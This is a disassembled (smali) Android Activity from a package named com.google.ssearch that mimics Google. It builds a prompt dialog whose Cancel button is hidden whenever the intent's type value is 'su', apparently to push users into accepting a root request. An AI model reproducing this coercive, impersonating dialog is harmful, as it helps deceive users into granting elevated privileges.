.class public Lcom/google/ssearch/Dialog;
.super Landroid/app/Activity;
.source "Dialog.java"


# instance fields
.field private cancle:Landroid/widget/Button;

.field private message:Landroid/widget/TextView;

.field private ok:Landroid/widget/Button;

.field private type:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    const/4 v0, 0x0

    .line 14
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 15
    iput-object v0, p0, Lcom/google/ssearch/Dialog;->message:Landroid/widget/TextView;

    .line 17
    iput-object v0, p0, Lcom/google/ssearch/Dialog;->ok:Landroid/widget/Button;

    .line 19
    iput-object v0, p0, Lcom/google/ssearch/Dialog;->cancle:Landroid/widget/Button;

    .line 21
    iput-object v0, p0, Lcom/google/ssearch/Dialog;->type:Ljava/lang/String;

    .line 14
    return-void
.end method

.method static synthetic access$0(Lcom/google/ssearch/Dialog;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 21
    iget-object v0, p0, Lcom/google/ssearch/Dialog;->type:Ljava/lang/String;

    return-object v0
.end method


# virtual methods
.method public init()V
    .locals 2

    .prologue
    .line 79
    iget-object v0, p0, Lcom/google/ssearch/Dialog;->ok:Landroid/widget/Button;

    new-instance v1, Lcom/google/ssearch/Dialog$1;

    invoke-direct {v1, p0}, Lcom/google/ssearch/Dialog$1;-><init>(Lcom/google/ssearch/Dialog;)V

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 90
    iget-object v0, p0, Lcom/google/ssearch/Dialog;->cancle:Landroid/widget/Button;

    new-instance v1, Lcom/google/ssearch/Dialog$2;

    invoke-direct {v1, p0}, Lcom/google/ssearch/Dialog$2;-><init>(Lcom/google/ssearch/Dialog;)V

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 96
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 12
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    const/16 v11, 0x11

    const/4 v10, -0x1

    const/4 v9, -0x2

    .line 24
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 26
    new-instance v2, Landroid/widget/LinearLayout;

    invoke-direct {v2, p0}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V

    .line 27
    .local v2, "layout":Landroid/widget/LinearLayout;
    const/4 v7, 0x1

    invoke-virtual {v2, v7}, Landroid/widget/LinearLayout;->setOrientation(I)V

    .line 30
    new-instance v5, Landroid/widget/LinearLayout$LayoutParams;

    invoke-direct {v5, v10, v9}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    .line 32
    .local v5, "params":Landroid/widget/LinearLayout$LayoutParams;
    invoke-virtual {v2, v5}, Landroid/widget/LinearLayout;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 33
    invoke-virtual {v2, v11}, Landroid/widget/LinearLayout;->setGravity(I)V

    .line 35
    new-instance v7, Landroid/widget/TextView;

    invoke-direct {v7, p0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    iput-object v7, p0, Lcom/google/ssearch/Dialog;->message:Landroid/widget/TextView;

    .line 36
    iget-object v7, p0, Lcom/google/ssearch/Dialog;->message:Landroid/widget/TextView;

    const/high16 v8, 0x41a00000    # 20.0f

    invoke-virtual {v7, v8}, Landroid/widget/TextView;->setTextSize(F)V

    .line 37
    iget-object v7, p0, Lcom/google/ssearch/Dialog;->message:Landroid/widget/TextView;

    new-instance v8, Landroid/widget/LinearLayout$LayoutParams;

    .line 38
    invoke-direct {v8, v10, v9}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    .line 37
    invoke-virtual {v7, v8}, Landroid/widget/TextView;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 39
    iget-object v7, p0, Lcom/google/ssearch/Dialog;->message:Landroid/widget/TextView;

    invoke-virtual {v2, v7}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 41
    new-instance v3, Landroid/widget/LinearLayout;

    invoke-direct {v3, p0}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V

    .line 42
    .local v3, "layout1":Landroid/widget/LinearLayout;
    const/4 v7, 0x0

    invoke-virtual {v3, v7}, Landroid/widget/LinearLayout;->setOrientation(I)V

    .line 44
    new-instance v6, Landroid/widget/LinearLayout$LayoutParams;

    invoke-direct {v6, v10, v9}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    .line 46
    .local v6, "params1":Landroid/widget/LinearLayout$LayoutParams;
    invoke-virtual {v3, v6}, Landroid/widget/LinearLayout;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 47
    invoke-virtual {v3, v11}, Landroid/widget/LinearLayout;->setGravity(I)V

    .line 49
    new-instance v7, Landroid/widget/Button;

    invoke-direct {v7, p0}, Landroid/widget/Button;-><init>(Landroid/content/Context;)V

    iput-object v7, p0, Lcom/google/ssearch/Dialog;->ok:Landroid/widget/Button;

    .line 50
    new-instance v7, Landroid/widget/Button;

    invoke-direct {v7, p0}, Landroid/widget/Button;-><init>(Landroid/content/Context;)V

    iput-object v7, p0, Lcom/google/ssearch/Dialog;->cancle:Landroid/widget/Button;

    .line 51
    new-instance v1, Landroid/widget/LinearLayout$LayoutParams;

    const/16 v7, 0xa0

    const/16 v8, 0x50

    invoke-direct {v1, v7, v8}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    .line 52
    .local v1, "buttonParams":Landroid/widget/LinearLayout$LayoutParams;
    iget-object v7, p0, Lcom/google/ssearch/Dialog;->ok:Landroid/widget/Button;

    invoke-virtual {v7, v1}, Landroid/widget/Button;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 53
    iget-object v7, p0, Lcom/google/ssearch/Dialog;->cancle:Landroid/widget/Button;

    invoke-virtual {v7, v1}, Landroid/widget/Button;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 56
    iget-object v7, p0, Lcom/google/ssearch/Dialog;->ok:Landroid/widget/Button;

    const-string v8, "OK"

    invoke-virtual {v7, v8}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    .line 57
    iget-object v7, p0, Lcom/google/ssearch/Dialog;->cancle:Landroid/widget/Button;

    const-string v8, "Cancel"

    invoke-virtual {v7, v8}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    .line 58
    iget-object v7, p0, Lcom/google/ssearch/Dialog;->ok:Landroid/widget/Button;

    invoke-virtual {v3, v7}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 59
    iget-object v7, p0, Lcom/google/ssearch/Dialog;->cancle:Landroid/widget/Button;

    invoke-virtual {v3, v7}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 61
    invoke-virtual {v2, v3}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 63
    invoke-virtual {p0, v2}, Lcom/google/ssearch/Dialog;->setContentView(Landroid/view/View;)V

    .line 65
    const-string v7, "\u63d0\u793a"

    invoke-virtual {p0, v7}, Lcom/google/ssearch/Dialog;->setTitle(Ljava/lang/CharSequence;)V

    .line 66
    invoke-virtual {p0}, Lcom/google/ssearch/Dialog;->init()V

    .line 67
    invoke-virtual {p0}, Lcom/google/ssearch/Dialog;->getIntent()Landroid/content/Intent;

    move-result-object v7

    invoke-virtual {v7}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    .line 68
    .local v0, "bundle":Landroid/os/Bundle;
    if-eqz v0, :cond_0

    .line 69
    const-string v7, "MSG"

    invoke-virtual {v0, v7}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 70
    .local v4, "msg":Ljava/lang/String;
    const-string v7, "TYPEdsada"

    invoke-virtual {v0, v7}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    iput-object v7, p0, Lcom/google/ssearch/Dialog;->type:Ljava/lang/String;

    .line 71
    iget-object v7, p0, Lcom/google/ssearch/Dialog;->message:Landroid/widget/TextView;

    invoke-virtual {v7, v4}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 72
    const-string v7, "su"

    iget-object v8, p0, Lcom/google/ssearch/Dialog;->type:Ljava/lang/String;

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_0

    .line 73
    iget-object v7, p0, Lcom/google/ssearch/Dialog;->cancle:Landroid/widget/Button;

    const/16 v8, 0x8

    invoke-virtual {v7, v8}, Landroid/widget/Button;->setVisibility(I)V

    .line 76
    .end local v4    # "msg":Ljava/lang/String;
    :cond_0
    return-void
.end method
